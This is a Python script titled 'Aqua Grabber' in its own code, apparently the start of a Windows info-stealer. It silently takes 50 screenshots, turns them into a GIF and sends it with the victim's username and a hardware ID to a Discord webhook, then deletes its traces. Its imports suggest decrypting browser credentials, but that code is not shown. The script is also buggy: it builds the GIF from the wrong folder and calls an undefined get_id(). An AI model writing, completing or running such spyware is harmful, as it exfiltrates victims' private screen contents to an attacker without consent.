import os
import random
import subprocess
import socket
import base64
import json
import os
import shutil
import sqlite3
import sys
import zipfile
import glob
from PIL import Image
import win32com.client

from datetime import datetime, timedelta

import cv2
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from discord_webhook import DiscordWebhook, DiscordEmbed
from mss import mss

user = os.environ.get("USERNAME")


def makeDir():
    if not os.path.exists('C:/Users/Public/Aqua'):
        os.mkdir("C:/Users/Public/Aqua")
    if not os.path.exists('C:/Users/Public/Aqua/ss'):
        os.mkdir("C:/Users/Public/Aqua/ss")


def takeSS():
    with mss() as sct:
        for i in range(50):
            sct.shot(mon=-1, output=f"C:/Users/Public/Aqua/{i}.png")
            print(f"Done SS Number {i}")

    frame_folder = f'C:/Users/Public/Aqua/ss'

    def make_gif():
        frames = [Image.open(image) for image in glob.glob(f"{frame_folder}/*")]
        frame_one = frames[0]
        frame_one.save(f"C:/Users/Public/Aqua/ss/SS.gif", format="GIF", append_images=frames,
                       save_all=True, duration=5, loop=1)

    make_gif()
    with open(f'C:/Users/Public/Aqua/ss/SS.gif', 'rb') as f:
        file_data = f.read()
    webhook.content = f'```{user} | ScreenShot | HWID: {get_id()}```'
    webhook.add_file(file_data, f'Aqua_{user}_SS.gif')
    print("Done")
    webhook.execute()
    webhook.remove_files()


# Clean Up
def cleanUp():
    shutil.rmtree('C:/Users/Public/Aqua')


webhook_url = 'WEBHOOK HERE'
webhook = DiscordWebhook(url=webhook_url)
embed = DiscordEmbed()
webhook.username = "Aqua Grabber"


def runAqua():
    takeSS()
    cleanUp()

runAqua()
